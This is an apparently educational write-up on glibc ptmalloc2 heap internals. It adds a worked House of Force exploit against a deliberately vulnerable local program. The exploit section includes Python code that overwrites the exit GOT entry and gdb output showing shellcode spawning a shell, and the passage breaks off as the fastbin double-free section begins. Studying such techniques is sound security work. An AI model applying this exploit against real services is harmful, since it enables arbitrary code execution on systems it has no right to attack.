Title: glibc malloc (ptmalloc2) 64bit exploitation on Ubuntu 16.04.4
Author: Claes M. Nyberg <cmn@nybergit.se>
Date: Summer 2018
Version: 1.0

"When in doubt, use brute force."
                -- Ken Thompson


--[ Table of contents
    1 - Introduction
        1.1 - The mallfest Program

    2 - Overview of glibc malloc (ptmalloc2)
        2.1 - The Chunk
        2.2 - main_arena
        2.3 - The Top Chunk
        2.4 - The fastbinsY Array
        2.5 - The Bins Array

    3 - Exploitation Techniques
        3.1 - House of Force
        3.2 - Fast Bin Double Free
        3.3 - House of Spirit
        3.4 - Fastbin Dup
        3.5 - Fastbin Dup Consolidate 
        3.6 - House of Einherjar
        x.x - Poinson NULL Byte
        x.x - House of Lore
        x.x - Overlapping Chunks

    References

--[ 1 - Introduction
In this article we discuss and summarize some known exploitation techniques for 
the ptmalloc2 implementation used by the GNU C library (glibc) running on 64 bit 
Linux systems. All examples have been developed and tested using Ubuntu 64-bit 
16.04.4 with glibc 2.23-0ubuntu10 which was downloaded from [1]. You can see 
what glibc version you are using by running the ldd program:

    $ ldd --version
    ldd (Ubuntu GLIBC 2.23-0ubuntu10) 2.23
    Copyright (C) 2016 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    Written by Roland McGrath and Ulrich Drepper.

All glibc source code references in this article refer to the
downloaded source code. In some examples, the output have been removed to simplify
reading, the removed output is replaces with the string "[snip]" (without quotes)
in those cases.

The ptmalloc2 implementaion is complex and can not be easily described in words
in substitute for reading the source code. This article aim to provide a higher 
level understanding of certain states with the goal to ease understanding of the 
exploit techniques discussed later in the article.

--[ 1.1 - The mallfest Program
When investigating the various states of the heap we will use a tool to aid
with allocating and free of memory using malloc(3) and free(3). We supply 
commands on the commandline to execute code that relates to the heap according 
to the usage description of the program: 

    $ ./mallfest 
    Malloc Fest - <cmn@nybergit.se>
    Usage: ./mallfest <cmd> [<cmd>...]
    Commands:
       <size>      - malloc(<size>)
       <size>:f    - free(malloc(<size>))
       f:<i>       - Free chunk allocated at argv[i]


--[ 2 - Overview of glibc malloc (ptmalloc2)
The glibc library first used Doug Lea malloc (dlmalloc) for their malloc
implementation [2]. The dlmalloc implementation was then used as a base for
implementing the thread safe memory allocating library called ptmalloc [2].
The glibc malloc implementation is derived from the successor to ptmalloc,
ptmalloc2 which now also support multiple heaps in a single application 
compared to the older implementations which only supported a single heap [2].

--[ 2.1 - The Chunk
The smallest component used by ptmalloc2 to organize memory is called a chunk. 
A chunk is described by the malloc_chunk structure at line 1108 in malloc.c:

-- Begin struct malloc_chunk 

/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a "view" into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/

struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

-- End

A pointer to a chunk, that is, a pointer to a struct malloc_chunk is type defined
as mchunkptr in the source code for simplicity. The structure need some 
clarification since it is a bit confusing, and can be simplified with the following
diagram:

Chunk pointer --> +----------------+
                  |  prev_size     | 8 bytes 
                  +----------------+
                  |  size + flags  | 8 bytes
Malloc pointer -> +----------------+
                  |      data      | 8 bytes (forward pointer if chunk is unused)
                  +----------------+
                  |      data      | 8 bytes (backward pointer is chunk is unused)
                  +----------------+
                  ...

When malloc(3) is called, 8 is added to the requested size to make room for the 
preceeding size field with flags. The size is then aligned to the next multiple 
of 16. The smallest size returned by ptmalloc2 running on a 64 bit system is 32 
bytes to make room for the four different values. Since the size is aligned to 
16, it allows for the lowest bits to be used as the flags P, M and A described 
below.

--[ Size flag 0x1 - P - Previous chunk is in use
When this flag is set, the previous chunk is in use and the prev_size
field is part of the memory used by that chunk. If this flag is not set,
the previouse chunk is not in use and the prev_size contain the size of
the previous chunk. The prev_size can then be used to find the start of 
the previous chunk by subtracting the size from the address of the 
current chunk.

--[ Size flag 0x2 - M - Allocated using mmap(2)
This flag indicates that the chunk was allocated using mmap(2) and
is not part of the heap at all. When such as chunk is free'd, munmap(2)
is called

--[ Size flag 0x4 - A - Chunk comes from main arena 
If this flag is zero, the chunk comes from the main arena and the main heap.
More about the main arena below. If the flag is set to one, it indicates that 
the chunk is part of an arena which was created using mmap(2). 
The address of the arena can be computed from the address of the chunk


--[ 2.2 - main_arena

The main arena is the memory pool that uses the main heap of the application. 
It has the following structure defined at line 1685 in malloc.c:

-- Begin struct malloc_state

struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};

-- End

The first time malloc is called, the main_arena is setup using 132KB of memory,
which is 132*1024=135168 bytes.


--[ 2.3 - The Top Chunk

Three things are of main interest in the malloc_state structure for us at this 
point; top, fastbinsY, and bins. The top chunk, also called the tail or 
wilderness chunk, is a special chunk which contain a big block of memory 
currently available to extract smaller chunks from when memory is requested 
by calling malloc(3) and no free chunks are available. The top chunk is created 
when malloc(3) is called for the first time which we can verify using the mallfest 
tool:

$ gdb ./mallfest
[snip]
Reading symbols from ./mallfest...done.
(gdb) break main
Breakpoint 1 at 0x400ba1: file mallfest.c, line 70.
(gdb) break mallfest.c:102
Breakpoint 2 at 0x400ecf: file mallfest.c, line 145.
(gdb) r 0x20
Starting program: ./mallfest 0x20

Breakpoint 1, main (argc=2, argv=0x7fffffffde98) at mallfest.c:70
70    {
(gdb) print main_arena
$1 = {mutex = 0, flags = 0, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, top = 0x0, 
  last_remainder = 0x0, bins = {0x0 <repeats 254 times>}, binmap = {0, 0, 0, 0}, 
  next = 0x7ffff7dd1b20 <main_arena>, next_free = 0x0, attached_threads = 1, system_mem = 0, 
  max_system_mem = 0}
(gdb) c
Continuing.
[1] 0x603010 = malloc(0x20)
Done.

Breakpoint 2, main (argc=2, argv=0x7fffffffde98) at mallfest.c:102
145        return 0;
(gdb) print main_arena
$2 = {mutex = 0, flags = 1, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x603440, last_remainder = 0x0, bins = {0x7ffff7dd1b78 <main_arena+88>, 
[snip]
  0x7ffff7dd21a8 <main_arena+1672>...}, binmap = {0, 0, 0, 0}, next = 0x7ffff7dd1b20 <main_arena>, 
next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168}
(gdb) print *(mchunkptr)0x603440
$4 = {prev_size = 0, size = 134081, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}
(gdb) 

The size of the top chunk is 134081 bytes when the second breakpoint is hit, 
which means that request for smaller sizes will extract chunks from the top 
chunk when there are no suitable free chunks available.

--[ 2.4 - The fastbinsY Array

The fastbinsY array contain pointers to chunk lists using the mfastbinptr type 
which is defined as a pointer to a malloc_chunk, just as mchunkptr.
These lists are called fastbins and consists of chunks with the same size, 
organized in a single linked list using the forward pointer in the chunk.
The fastbin at index zero contain chunks of size 32 bytes, the fastbin at
index one contain chunks of size 32+16 = 48. There are a total of ten fast 
bins which hold chunk sizes of 0x20, 0x30, ..., 0x90, 0xa0 bytes, so the 
maximum chunk size supported by fastbins is 160 bytes for 64bit. 
The default value however, is 128 bytes, i.e. 0x80 in hex, which is defined 
by DEFAULT_MXFAST at line 798 in malloc.c.

We learn the largest chunk size used by our Ubuntu installation by running
the mallfest tool multiple times in gdb and allocate different sizes which
are free'd directly after and then display the fastbinsY array. 

$ gdb ./mallfest
[snip]
(gdb) break mallfest.c:102
Breakpoint 1 at 0x400cf7: file mallfest.c, line 102.
(gdb) r 0x78:f
Starting program: ./mallfest 0x78:f
[1] 0x603010 = malloc(0x78)
[1] free(0x603010);
Done.

Breakpoint 1, main (argc=2, argv=0x7fffffffde98) at mallfest.c:102
102        return 0;
(gdb) display main_arena->fastbinsY
1: main_arena->fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x603000, 0x0, 0x0, 0x0}
(gdb) print *(mfastbinptr)main_arena->fastbinsY[6]
$1 = {prev_size = 0, size = 129, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}
(gdb) 

We can see above that the chunk of size 128 end up in the fastbin at index six
after it is free'd. Let's run again with a chunk size of 0x90, the next fastbin size:

(gdb) r 0x88:f
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: ./mallfest 0x88:f
[1] 0x603010 = malloc(0x88)
[1] free(0x603010);
Done.

Breakpoint 1, main (argc=2, argv=0x7fffffffde98) at mallfest.c:102
102        return 0;
1: main_arena->fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
(gdb) 

Now all the fastbin arrays are empty from which we can draw the conclusion
that our malloc implementation uses a maximum fastbin chunk of size 0x80.

Let's run mallfest again and allocate two chunks which will end up in the same
fastbin array when they are free'd to learn how they are organized:

(gdb) r 0x18 0x18 f:1 f:2 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: ./mallfest 0x18 0x18 f:1 f:2
[1] 0x603010 = malloc(0x18)
[2] 0x603440 = malloc(0x18)
[1] free(0x603010);
[2] free(0x603440);
Done.

Breakpoint 1, main (argc=5, argv=0x7fffffffde78) at mallfest.c:102
102        return 0;
1: main_arena->fastbinsY = {0x603430, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
(gdb) print *(mchunkptr)0x603430
$2 = {prev_size = 0, size = 33, fd = 0x603000, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20bb1}
(gdb) print *(mchunkptr)0x603000
$3 = {prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x411}
(gdb) 

Note that fd_nextsize and bk_nextsize are actually not used in this chunk since
thay are only valid for large chunks, simply ignore those values for now.

We can see that both chunks end up in the same fastbin for size 0x20 and that 
the first chunk in the list is 0x603430 and it has a forward pointer set to 
the other chunk at 0x603000, which can be illustrated like this:


0x603430 --> +----------------+  |--> 0x603000 --> +----------------+
             |  prev_size:0   |  |                 |  prev_size:0   |
             +----------------+  |                 +----------------+
             | size+flags:33  |  |                 | size+flags:33  |
             +----------------+  |                 +----------------+
             | fd:0x603000    |--|                 | fd:0           | 
             +----------------+                    +----------------+
             | bk:0           |                    | bk:0           |
             +----------------+                    +----------------+

The first conclusion we can make from the diagram is that all operations on 
the fastbin list is performed at the front of the list, which makes perfect sense 
since it result in constant complexity. When a chunk is free'd it is simply just 
set as the first chunk in the fastbin for its size with the forward pointer set 
to the chunk which previously was first in the list, i.e. NULL for the first 
chunk added which will NULL terminate the single linked list.

The second conclusion we can make is that chunks in the fastbin lists are 
never consolidated into bigger chunks since the previous in use (P) bit are 
set even though the chunks are not in use (looking deeper into the source code
we can actually see that the previous in use bit is ignored for chunks in the
fastbins).

--[ 2.5 - The bins array
The bins array contain three different types of chunks, unsorted, small and 
large. But the bins array does not contain chunks, it is an array of forward 
and backward pointers, hence NBINS * 2 as the size above. This makes accessing
the bins array require some trickery when it comes to indexing. The macro
bin_at on line 1399 in malloc.c help us with that:

-- Begin line 1399 in malloc.c

/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
  (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))               \
             - offsetof (struct malloc_chunk, fd))
-- End

As we can see, accessing index 9 actually return the content for index 16
because of the forward and backward pointers. The bins array is organized 
as follows when it comes to accessed indexes:

bins[1] - Unsorted
bins[2] ... bins[63] - Small bin
bins[64] ... bins[127] - Large bin

--[ 2.5.1 Unsorted bin
The unsorted bin is a double linked list of free chunks which has not yet been
added to a bin. Chunks of all sizes gets added to the unsorted bin when they
are free'd to give malloc a chance to reuse the recently free'd chunks and speed
up allocation and deallocation. The last entry in the double linked list has its
forward pointer set to the start of the list and the first entry in the list has
its backward pointer set to the last chunk, creating a circulair list. 
The unsorted bin is located at index 1 in the bins array, which actually results
in a forward pointer at index 0 and backward pointer at index 1.

Let us place a chunk into the unsorted bin using the mallfest tool. We first 
allocate 0x88 bytes and then 0x0a bytes before we free the first chunk. The
reason for allocating an extra chunk is to avoid consolidation with the top
chunk when we call free to force placement in the unsorted bin.

$ gdb ./mallfest
[snip]
(gdb) break mallfest.c:102
Breakpoint 1 at 0x400d1d: file mallfest.c, line 102.
(gdb) r 0x88 0xa0 f:1
Starting program: ./mallfest 0x88 0xa0 f:1
[1] 0x603010 = malloc(0x88)
[2] 0x6030a0 = malloc(0xa0)
[1] free(0x603010);
Done.

Breakpoint 1, main (argc=4, argv=0x7fffffffddf8) at mallfest.c:102
102	    return 0;
(gdb) print main_arena->bins
$2 = {0x603000, 0x603000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
  0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>,
[snip]
(gdb) print *(mchunkptr)main_arena->bins[1]
$3 = {prev_size = 0, size = 145, fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, fd_nextsize = 0x0, bk_nextsize = 0x0}

As we can see, our chunk of size 144 bytes (0x88+8) which was free'd has been 
placed in the unsorted bin. The forward and backward pointers of the free'd 
chunk both point to the unsorted bin at index 1 in the bins array.

--[ 2.5.2 Small bin

-- Begin line 1469 in malloc.c

#define NBINS             128
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ)
#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)

-- End

Sinze we are using a 64bit system, SIZE_SZ is 8 and MALLOC_ALIGNMENT is
set to 2*8 = 16. This gives us that MIN_LARGE_SIZE = 1024, which mean that
small chunks are less than 1024 bytes and larger than the biggest fastbin size
which is 0x80, so small chunks are bigger than 128 and less than 1024 bytes in 
size. Also, small bins contain chunks of the same sizes, just like the fastbins [3].

As we can see from the value of NSMALLBINS, there are 64 bins for small chunks,
but lets put that aside for a moment and see if we can put the chunk inside
the unsorted bin into a small bin. We do this by adding another call to malloc
after the free. The added call to malloc have to be larger than the free'd chunk.

(gdb) r 0x88 0xa0 f:1 0x100
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: ./mallfest 0x88 0xa0 f:1 0x100
[1] 0x603010 = malloc(0x88)
[2] 0x6030a0 = malloc(0xa0)
[1] free(0x603010);
[4] 0x603150 = malloc(0x100)
Done.

Breakpoint 1, main (argc=5, argv=0x7fffffffddd8) at mallfest.c:102
102	    return 0;
(gdb) print main_arena->bins
$6 = {0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 
  0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 
  0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 
  0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 
  0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1bd8 <main_arena+184>, 0x7ffff7dd1be8 <main_arena+200>, 
  0x7ffff7dd1be8 <main_arena+200>, 0x603000, 0x603000, 0x7ffff7dd1c08 <main_arena+232>, 
[snip]

Now our chunk has moved into the bins array and we find pointers to it at 
indexes 16 and 17. The index passed onto bin_at is actually calculated by 
another macro which is based on the chunk size. For small size chunks it
is defined at line 1478 in malloc.c

-- Begin line 1478 in malloc.c

#define smallbin_index(sz) \
  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) : (((unsigned) (sz)) >> 3))\
   + SMALLBIN_CORRECTION)

-- End

Since SMALLBIN_WIDTH is 16 for us, we see that the index is (sz) >> 4 which
is 0x90 >> 4 = 9. We learned previously that 0x80 is the largest size of fast 
bin chunks, and can draw the conclusion that the bin indexes below is unused
with the exception of the unsorted bin at index 1. 

--[ 2.5.3 Large bin
As we learned previously, large chunks are all chunks of size 1024 bytes or 
greater according to the value of MIN_LARGE_SIZE. Chunks in large bins are
not of the same size [3], instead they are stored in increasing order [3].

The first 32 large bin indexes (from 64 to 86) contain chunks that are 64 bytes 
apart in size, the next 16 (from 87 to 102) contain chunks that are 512 bytes
apart. It follows a logarithmic pattern:

    32 bins (index 64 to 96) of chunks 64 bytes apart 
    16 bins (index 97 to 112) of chunks 512 bytes apart 
     8 bins (index 113 to 120) of chunks 4096 bytes apart 
     4 bins (index 121 to 124 ) of chunks 32768 bytes apart 
     2 bins (index 125 and 126) of chunks 262144 bytes apart 
     1 bin (index 127) with one chunk of what is left

--[ 3 - Exploitation Techniques
The following sections discuss known exploitation techniques from various
sources.

--[ 3.1 House of Force (adapted from [4], [5])
Requirements:
1) Be able to overwrite top chunk size, e.g by an overflow
2) Be able to allocate chunk of arbitrary size
3) Be able to allocate an additional chunk with controlled content

The house of force technique is one of the simplest heap overflow techniques
since it require very little knowledge about the ptmalloc2 internals.
When a chunk is allocated by extracting memory from the top chunk it will become
adjacent to the top chunk as the top chunk will be continuous to the allocated 
chunk in memory. Let's look at this using mallfest.

$ gdb ./mallfest
(gdb) break mallfest.c:102
Breakpoint 1 at 0x400d1d: file mallfest.c, line 102.
(gdb) r 256
Starting program: /raid1/overkill/private/work/nps/CTF/docs/ptmalloc/mallfest 256
[1] 0x603010 = malloc(0x100)
Done.

Breakpoint 1, main (argc=2, argv=0x7fffffffdea8) at mallfest.c:102
102        return 0;
(gdb) print main_arena->top
$1 = (mchunkptr) 0x603110
(gdb) print *main_arena->top
$2 = {prev_size = 0, size = 134897, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}
(gdb) print *(mchunkptr)0x603000
$3 = {prev_size = 0, size = 273, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}
(gdb) print *(mchunkptr)(0x603000+272)
$4 = {prev_size = 0, size = 134897, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}
(gdb) 

After allocating 256 bytes, which actually result in 272 bytes, the returned 
chunk is located just before the top chunk in memory, which is illustrated 
with the following diagram:


             Chunk 0x603000 (malloc(256))
             +-------------+
             | prev_size ? |
             +-------------+
from malloc  |  size: 273  |
0x603010 --> +-------------+
             |             |
             +-------------+
             |             |
             +-------------+ 
             ...

             Chunk 0x603110 (top)
0x603000+272 +-------------+
             | prev_size ? |
             +-------------+
             |  size:134897|
             +-------------+
             |  fd:0       |
             +-------------+
             |  bk:0       |
             +-------------+

Since the chunks are continious in memory, the address of the top chunk is 
computed based on the address and size of the previous chunk.
With this knowledge in mind we can exploit the following vulnerable program:

-- Begin lines from vuln_3.1.c

    10    void
    11    vuln(void)
    12    {
    13        char *buf;
    14        size_t len;
    15    
    16        fread(&len, sizeof(len), 1, stdin);
    17        fprintf(stderr, "malloc(%lu)\n", len);
    18        buf = malloc(len);
    19        fprintf(stderr, "%p\n", buf);
    20        fgets(buf, 256, stdin);
    21    
    22        fread(&len, sizeof(len), 1, stdin);
    23        buf = malloc(len);
    24        fprintf(stderr, "%p\n", buf);
    25        fgets(buf, 256, stdin);
    26    
    27        fread(&len, sizeof(len), 1, stdin);
    28        buf = malloc(len);
    29        fprintf(stderr, "%p\n", buf);
    30        fgets(buf, 256, stdin);
    31    }
    32    
    33    int
    34    main(int argc, char **argv)
    35    {
    36        setvbuf(stdin, NULL, _IONBF, 0);
    37        setvbuf(stdout, NULL, _IONBF, 0);
    38        setvbuf(stderr, NULL, _IONBF, 0);
    39    
    40        vuln();
    41        exit(0);
    42    }

-- End

We use the bindprog tool which fork, dup and then execve the vulnerable 
program when a client connectsi to a local port:

$ ./bindprog 4444 ./vuln_3.1
[25367] Accepting clients for './vuln_3.1' on 127.0.0.1:4444
127.0.0.1:40744 connected
attach 31690

By adding a small delay after connecting to the server, we get time to attach
to the vulnerable process and watch each of the three steps in the exploit.

$ gdb ./vuln_3.1
[snip]
(gdb) attach 31690
[snip]
(gdb) break vuln_3.1.c:20
Breakpoint 1 at 0x400837: file vuln_3.1.c, line 20.
(gdb) c
Continuing.

--[ 3.1.1 vuln_3.1.c lines 16-20
First, request 100 bytes from malloc and compute the address of the top chunk,
then fill the buffer with shellcode (dup+execve, 60 bytes)and overwrite the top 
chunk size with 0xffffffffffffffff. The python code for this in our exploit 
correspond to the following lines:

-- Begin lines from vuln_3.1-xpl.py

   111    print("[+] Requesting malloc size of 100")
   112    s.send(struct.pack("<Q", int(100)))
   113    readuntil(s, '\n')
   114    first_chunk = int(readuntil(s, '\n'), 16)
   115    first_chunk -= 16
   116    # align16(100 + 8) = 112
   117    top_chunk = first_chunk + 112 
   118    print("[+] first chunk at 0x%x" %(first_chunk))
   119    print("[+] top chunk at 0x%x" %(top_chunk))
   120    
   121    new_top_size  = 0xffffffffffffffff
   122    print("[+] Using shellcode of length " + str(len(code)))
   123    print("[+] Overflowing top chunk size with 0x%x" %(new_top_size))
   124    s.send(code.rjust(104, "\x90") + struct.pack("<Q", new_top_size) + "\n")

-- End

Since the vulnerable program output the address returned by malloc it
is easy for us to compute the address of the top chunk after allocating the
first chunk.

Breakpoint 1, vuln () at vuln_3.1.c:20
20        fgets(buf, 256, stdin);
(gdb) next
22        fread(&len, sizeof(len), 1, stdin);

At this point the first chunk contain the shellcode and the size of the top 
chunk is overflowed which we can see using
gdb:
(gdb) print *(mchunkptr)0x602000
$1 = {prev_size = 0, size = 113, fd = 0x9090909090909090, bk = 0x9090909090909090, 
  fd_nextsize = 0x9090909090909090, bk_nextsize = 0x9090909090909090}
(gdb) print *main_arena->top
$2 = {prev_size = 364607111340298072, size = 18446744073709551615, fd = 0xa, bk = 0x0, 
  fd_nextsize = 0x0, bk_nextsize = 0x0}

The layout of the chunks in memory now look like this:

             Chunk 0x602000 (malloc(100))
             +-------------+
             | prev_size ? |
             +-------------+
from malloc  |  size: 113  |
0x602010 --> +-------------+
             |\x90\x90\x90...
             ...

             Chunk 0x602070 (top)
0x602000+112 +-------------+
             | prev_size: 0x050f583c6a050f58 (end of shellcode)
             +-------------+
             |  size: 0xffffffffffffffff
             +-------------+
             |  fd:0xa     | (newline)
             +-------------+
             |  bk:0       |
             +-------------+

--[ 3.1.2 vuln_3.1.c lines 22-25
The second step in our exploit allow us to allocate memory using malloc with a
controlled size. We use this to overflow the size of the top chunk into an 
address which we want to write to later, since that address is returned by malloc
the next-next time malloc is called. Since exit is called on line 41 in the
vulnerable program the GOT entry of exit is a good target, we find it using
readelf:

$ readelf --relocs vuln_3.1
[snip]
Relocation section '.rela.plt' at offset 0x540 contains 8 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 fread@GLIBC_2.2.5 + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
000000601038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 fprintf@GLIBC_2.2.5 + 0
000000601040  000700000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000601048  000800000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000601050  000900000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0

So we want to write a return address at 0x601050. This is a perfect target since 
it is already aligned to 16 bytes. If it was not aligned to 16, we would have to 
overwrite more parts of the GOT table which could result in unwanted corruptions.

In order to make the next-next call to malloc return a pointer to the GOT entry
we need to compute the evil size passed onto malloc at this tep with some things 
in mind. For starters, the chunk will start at 0x601050-0x10 to make room for the 
previous size and size fields, which means that 0x601048, the GOT for setvbuf,
will be overwritten with the size field. This does not bother us now since
setvbuf is never called again but could cause problems otherwise. 

The lines in the exploit that corresponds to this step are:

-- Begin lines from vuln_3.1-xpl.py

   126    write_target = 0x601050 # GOT exit
   127    evil_size = (write_target - 16 - (8*2) - top_chunk)
   128    evil_size &= 0xffffffffffffffff # 8 bytes
   129    print("[+] Write target: 0x%x" %(write_target))
   130    print("[+] Using evil size 0x%x" %(evil_size))
   131    s.send(struct.pack("<Q", evil_size))
   132    s.send("\n")
   133    readuntil(s, '\n')

-- End

We compute the evil size to send as follows
evil_size = (write_target - 16 - (8*2) - top_chunk)
evil_size = (0x601050 - 16 - (8*2) - 0x602070)

Since we want the next chunk to have the address of our write target minus 16,
we subtract 16 from the write target first. After that we need to make room 
for two size fields, which is another 8*2=16 bytes.

And finaly, since python uses large number we trim down the result to 8 bytes:
evil_size &= 0xffffffffffffffff = 0xffffffffffffefc0

Although we just send a single newline as data we could of course populate the
buffer with more shellcode if we wanted to. After this step, the address of the 
top chunk should be 0x601050-0x10=0x601040.
Which we verify using gdb:
(gdb)  break vuln_3.1.c:26
Breakpoint 2 at 0x4008b4: file vuln_3.1.c, line 26.
(gdb) c
Continuing.

Breakpoint 2, vuln () at vuln_3.1.c:27
27        fread(&len, sizeof(len), 1, stdin);
(gdb) print main_arena->top
$6 = (mchunkptr) 0x601040

The memory layout of the allocated chunks and the top chunk now look like this:

             Chunk 0x602000 (malloc(100))
             +-------------+
             | prev_size ? |
             +-------------+
from malloc  |  size: 113  |
0x602010 --> +-------------+
             |\x90\x90\x90...
             ...

             Chunk 0x602070 
0x602000+112 +-------------+
             | prev_size: 0x050f583c6a050f58 (end of shellcode)
             +-------------+
             |  size: 0xffffffffffffefd1 (evil size + previous in use bit)
             +-------------+
             |  fd:0xa     | (newline)
             +-------------+
             |  bk:0       |
             +-------------+
             ...

             Chunk 0x601040 (top)
0x602070-4144+-------------+
             | prev_size: 7ffff7a91130 (GOT malloc)
             +-------------+
from malloc  |  size: 4137 (GOT setvbuf)
0x601050 --> +-------------+
             |  0x00000000004006a6 (GOT exit)
             +-------------+

--[ 3.1.3 vuln_3.1.c lines 26-30
In the final step we allocate a small size of memory to make malloc return 
a pointer to the GOT entry for exit and overwrite it with the desired return 
address. The lines in the exploit for this step are:

-- Begin lines from vuln_3.1-xpl.py

   135    ret_addr = first_chunk + 16
   136    print("[+] Using return address: 0x%x" %(ret_addr))
   137    s.send(struct.pack("<Q", int(32)))
   138    s.send(struct.pack("<Q", ret_addr) + "\n")
   139    readuntil(s, '\n')

-- End

We put a breakpoint at exit and watch how the shellcode is executed:

(gdb) break vuln_3.1.c:41
Breakpoint 3 at 0x40099e: file vuln_3.1.c, line 41.
(gdb) c
Continuing.

Breakpoint 3, main (argc=1, argv=0x7fffffffee78) at vuln_3.1.c:41
41        exit(0);
(gdb) x/gx 0x601050
0x601050:    0x0000000000602010
(gdb) stepi
0x00000000004009a3    41        exit(0);
(gdb) break *0x0000000000602010
Breakpoint 4 at 0x602010
(gdb) c
Continuing.
Breakpoint 4, 0x0000000000602010 in ?? ()
1: x/6i $rip
=> 0x602010:    nop
   0x602011:    nop
   0x602012:    nop
   0x602013:    nop
   0x602014:    nop
   0x602015:    nop
(gdb) c
Continuing.
process 3759 is executing new program: /bin/dash

--[ 3.2 Fastbin Double Free (Adapted From [5])
Requirements:
1) Two chunks (a and b below) allocated with the same final fastbin size
2) The fastbin size somwhere in memory close to where we want to overwrite
3) A double free on one of the chunks allocated (free(a); free(b); free(a))

As we learned earlier, the fastbins are singel linked list with chunks
of the same size. The insert and delete operations are performed at the 
head of the list in a last in first out operation (LIFO). The double free 
situation required above looks something like this in C, where len will 
result in a chunks size for any of the fastbins:

              bufa = malloc(len);
              bufb = malloc(len);

              free(bufa);
              free(bufb);
              free(bufa);

Lets run the code using mallfest and see how the chunks are layed out in 
memory. Keep in mind that we only care about the size and forward pointer (fd) 
in the chunks.

$ gdb ./mallfest
[snip]
(gdb) break mallfest.c:87
Breakpoint 1 at 0x400c25: file mallfest.c, line 87.
(gdb) r 0x18 0x18 f:1 f:2 f:1
Starting program: ./mallfest 0x18 0x18 f:1 f:2 f:1
[1] 0x603010 = malloc(0x18)
[2] 0x603030 = malloc(0x18)
[1] free(0x603010);

Breakpoint 1, main (argc=6, argv=0x7fffffffe608) at mallfest.c:87
87                continue;
